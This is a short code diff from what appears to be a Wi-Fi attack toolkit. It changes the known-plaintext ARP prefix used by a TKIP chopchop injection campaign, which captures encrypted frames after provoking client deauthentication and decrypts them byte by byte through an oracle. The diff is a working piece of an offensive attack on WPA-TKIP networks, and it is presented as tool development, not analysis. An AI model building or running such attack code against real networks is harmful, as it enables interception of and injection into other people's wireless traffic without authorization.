@@ -22,12 +22,12 @@ from wifit3.models import AccessPoint
 
 logger = logging.getLogger(__name__)
 
-# LLC/SNAP + ethertype ARP + htype/ptype/hlen/plen/op=REPLY: the known-plaintext head of the
-# AP's ARP reply to the client's deauth-provoked request (the seed frame we chop). Mirrors
-# WEP ChopChop's _KNOWN_ARP16, op=2 (reply) since the captured frame is AP -> client.
-_KNOWN_ARP_REPLY_PREFIX = bytes([
+# LLC/SNAP + ethertype ARP + htype/ptype/hlen/plen + opcode HIGH byte: the invariant head of an
+# AP -> client ARP seed frame, stopping one byte short of the opcode low byte so the request/reply
+# distinguisher (op=1 vs op=2) is oracle-recovered rather than assumed.
+_KNOWN_ARP_PREFIX = bytes([
     0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06,
-    0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x02,
+    0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00,
 ])
 # payload(28) + Michael MIC(8) + ICV(4): the shortest cipher worth chopping for an ARP seed.
 _MIN_SEED_CIPHER_LEN = 40
@@ -149,7 +149,7 @@ class TkipInject(Campaign):
             self.log(treelog.branch(f"[dim]{len(cipher)}B cipher captured, chopping…[/dim]"))
 
             self.chop = TkipChop(
-                iface, cipher, _KNOWN_ARP_REPLY_PREFIX,
+                iface, cipher, _KNOWN_ARP_PREFIX,
                 bssid=self.bssid_bytes, client=str_to_mac(dest), tid=tid, tsc=tsc,
                 countermeasure_interval=self.countermeasure_interval,
                 should_stop=lambda: self.stopped,
